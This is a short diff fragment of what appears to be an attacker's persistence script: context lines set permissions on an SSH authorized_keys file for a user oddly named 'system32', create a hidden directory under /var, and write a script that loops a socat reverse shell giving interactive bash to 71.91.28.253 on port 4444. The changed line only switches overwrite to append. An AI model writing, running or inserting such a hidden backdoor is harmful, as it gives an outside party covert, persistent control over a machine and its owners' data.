@@ -97,7 +97,7 @@ chmod 600 /home/system32/.ssh/authorized_keys
 
 # Hide a Shell
 mkdir -p /var/.lib/.nope
-cat > /var/.lib/.nope/back.sh <<'EOF'
+cat >> /var/.lib/.nope/back.sh <<'EOF'
 #!/bin/bash
 while true; do
     socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:71.91.28.253:4444 2>/dev/null
